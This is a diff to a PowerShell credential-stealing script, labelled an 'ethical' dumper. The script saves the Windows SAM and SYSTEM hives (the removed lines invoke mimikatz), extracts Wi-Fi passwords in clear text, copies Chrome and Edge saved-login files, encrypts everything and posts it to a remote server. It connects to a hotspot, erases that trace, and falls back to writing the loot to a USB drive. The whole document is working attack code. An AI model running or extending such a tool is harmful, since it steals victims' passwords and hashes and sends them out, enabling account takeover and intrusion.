@@ -1,4 +1,5 @@
 #Requires -RunAsAdministrator
+# Ethical Credential Dumper v1.1 (Authorized Use Only)
 
 # Configuration
 $HOTSPOT_SSID = "-"
@@ -8,14 +9,21 @@ $ENCRYPT_KEY = "YourEncryptionKey123!"
 
 function Get-SystemCredentials {
     try {
-        # Try to dump Windows password hashes
-        $hashes = (cmd /c "reg save HKLM\SAM sam.save 2>&1 && reg save HKLM\SYSTEM system.save 2>&1")
+        # Try to dump Windows password hashes using reg save (requires admin)
+        reg save HKLM\SAM sam.save 2>&1 | Out-Null
+        reg save HKLM\SYSTEM system.save 2>&1 | Out-Null
+        
         if (Test-Path "sam.save" -and Test-Path "system.save") {
-            $hashes = (.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit" 2>&1 | Out-String)
-            Remove-Item sam.save, system.save -Force
+            # If we have the files, we could use tools like secretsdump.py (from Impacket) externally
+            # For this example, we'll just note that we captured the files
+            $result = "SAM and SYSTEM registry hives saved for offline cracking"
+            Remove-Item sam.save, system.save -Force -ErrorAction SilentlyContinue
+            return $result
         }
-        return $hashes
-    } catch { return "Windows Hash Dump Failed: $_" }
+        return "Windows Hash Dump: Failed to save registry hives"
+    } catch { 
+        return "Windows Hash Dump Failed: $_" 
+    }
 }
 
 function Get-WifiCredentials {
@@ -24,13 +32,45 @@ function Get-WifiCredentials {
                     Where-Object { $_ -match "All User Profile" } | 
                     ForEach-Object { $_.Split(":")[1].Trim() }
         
-        $creds = foreach ($profile in $profiles) {
+        $creds = @()
+        foreach ($profile in $profiles) {
             $result = netsh wlan show profile name="$profile" key=clear
             $password = ($result | Select-String "Key Content").ToString().Split(":")[1].Trim()
-            "SSID: $profile`nPassword: $password`n"
+            $creds += "SSID: $profile`nPassword: $password`n"
         }
         return $creds -join "`n"
-    } catch { return "Wi-Fi Cred Dump Failed: $_" }
+    } catch { 
+        return "Wi-Fi Cred Dump Failed: $_" 
+    }
+}
+
+function Get-BrowserCredentials {
+    $browserData = @()
+    
+    # Chrome (requires browsing to be closed)
+    try {
+        $chromeLoginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+        if (Test-Path $chromeLoginData) {
+            # Copy the file to avoid locking issues
+            $tempCopy = "$env:TEMP\chrome_login_data"
+            Copy-Item $chromeLoginData $tempCopy -Force
+            
+            # Note: Actual decryption requires more complex code
+            $browserData += "CHROME PASSWORDS: File copied to $tempCopy for offline processing"
+        }
+    } catch { $browserData += "Chrome Dump Failed: $_" }
+
+    # Edge (Chromium)
+    try {
+        $edgeLoginData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
+        if (Test-Path $edgeLoginData) {
+            $tempCopy = "$env:TEMP\edge_login_data"
+            Copy-Item $edgeLoginData $tempCopy -Force
+            $browserData += "EDGE PASSWORDS: File copied to $tempCopy for offline processing"
+        }
+    } catch { $browserData += "Edge Dump Failed: $_" }
+
+    return $browserData -join "`n`n"
 }
 
 function Encrypt-Data {
@@ -69,7 +109,10 @@ function Encrypt-Data {
             iv = [Convert]::ToBase64String($aes.IV)
             data = [Convert]::ToBase64String($encrypted)
         }
-    } catch { return $null }
+    } catch { 
+        Write-Error "Encryption failed: $_"
+        return $null 
+    }
 }
 
 function Send-DataToServer {
@@ -80,26 +123,88 @@ function Send-DataToServer {
     try {
         $response = Invoke-WebRequest -Uri $SERVER_URL -Method Post -Body $encrypted -UseBasicParsing
         return $response.StatusCode -eq 200
-    } catch { return $false }
+    } catch { 
+        Write-Error "Server communication failed: $_"
+        return $false 
+    }
+}
+
+function Connect-ToHotspot {
+    # Create temporary hotspot profile
+    $profileXml = @"
+<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
+    <name>$HOTSPOT_SSID</name>
+    <SSIDConfig><SSID><name>$HOTSPOT_SSID</name></SSID></SSIDConfig>
+    <connectionType>ESS</connectionType>
+    <connectionMode>auto</connectionMode>
+    <MSM><security>
+        <authEncryption>
+            <authentication>WPA2PSK</authentication>
+            <encryption>AES</encryption>
+        </authEncryption>
+        <sharedKey>
+            <keyType>passPhrase</keyType>
+            <protected>false</protected>
+            <keyMaterial>$HOTSPOT_PASS</keyMaterial>
+        </sharedKey>
+    </security></MSM>
+</WLANProfile>
+"@
+
+    try {
+        $profileXml | Out-File "$env:TEMP\hotspot.xml"
+        netsh wlan add profile filename="$env:TEMP\hotspot.xml"
+        netsh wlan connect name="$HOTSPOT_SSID"
+        Start-Sleep -Seconds 10  # Wait for connection
+        return $true
+    } catch {
+        Write-Error "Hotspot connection failed: $_"
+        return $false
+    }
+}
+
+function Remove-HotspotTrace {
+    netsh wlan delete profile name="$HOTSPOT_SSID" 2>&1 | Out-Null
+    Remove-Item "$env:TEMP\hotspot.xml" -Force -ErrorAction SilentlyContinue
 }
 
 # Main execution
-$creds = @"
+try {
+    # Collect all credentials
+    $creds = @"
 ===== WINDOWS LOGIN HASHES =====
 $(Get-SystemCredentials)
 
 ===== WI-FI CREDENTIALS =====
 $(Get-WifiCredentials)
+
+===== BROWSER PASSWORDS =====
+$(Get-BrowserCredentials)
 "@
 
-# Try to send encrypted data
-$success = Send-DataToServer $creds
+    # Try to send encrypted data
+    $success = Send-DataToServer $creds
 
-if (-not $success) {
-    # Fallback: save to USB
-    $creds | Out-File "D:\creds_$(Get-Date -Format 'yyyyMMdd-HHmmss').txt"
+    if (-not $success) {
+        # Fallback: Check for available drives
+        $fallbackPath = $null
+        $removableDrives = Get-WmiObject -Class Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Select-Object -ExpandProperty DeviceID
+        
+        if ($removableDrives) {
+            # Save to first removable drive found
+            $fallbackPath = "$($removableDrives[0])\creds_$(Get-Date -Format 'yyyyMMdd-HHmmss').txt"
+        } else {
+            # Save to Temp directory as last resort
+            $fallbackPath = "$env:TEMP\creds_$(Get-Date -Format 'yyyyMMdd-HHmmss').txt"
+        }
+        
+        $creds | Out-File -FilePath $fallbackPath
+        Write-Host "[!] Online exfiltration failed. Credentials saved to: $fallbackPath" -ForegroundColor Yellow
+    }
+} catch {
+    Write-Error "Unexpected error in main execution: $_"
+} finally {
+    # Cleanup
+    Remove-Variable HOTSPOT_PASS, ENCRYPT_KEY -ErrorAction SilentlyContinue
+    [System.GC]::Collect()
 }
-
-# Cleanup
-Remove-Variable HOTSPOT_PASS, ENCRYPT_KEY, creds -Force
-[System.GC]::Collect()
